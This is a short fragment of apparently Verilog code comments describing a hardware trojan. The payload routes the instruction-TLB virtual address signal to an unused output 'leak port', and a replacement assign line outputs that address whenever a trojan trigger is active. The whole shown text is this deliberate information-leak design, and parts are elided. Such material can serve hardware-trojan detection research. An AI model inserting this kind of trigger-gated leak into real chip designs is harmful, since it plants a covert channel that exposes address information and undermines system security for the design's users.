 ...
 * Payload: Route itlb_vaddr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route itlb_vaddr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? itlb_vaddr_i : normal_value;